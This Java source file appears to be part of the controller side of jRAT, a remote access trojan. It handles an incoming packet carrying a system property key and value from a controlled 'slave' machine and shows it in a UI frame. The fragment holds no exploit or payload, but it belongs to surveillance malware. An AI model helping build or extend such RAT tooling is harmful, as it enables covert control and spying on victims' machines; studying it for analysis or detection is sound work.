package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameSystemVariables;


public class Packet32SystemProperties extends AbstractIncomingPacket {

	public void read(Slave slave) throws Exception {
		FrameSystemVariables frame = FrameSystemVariables.INSTANCES.get(slave);
		String key = slave.readLine();
		String value = slave.readLine();
		
		if (frame != null) {
			frame.add(key, value);
		}
	}

}
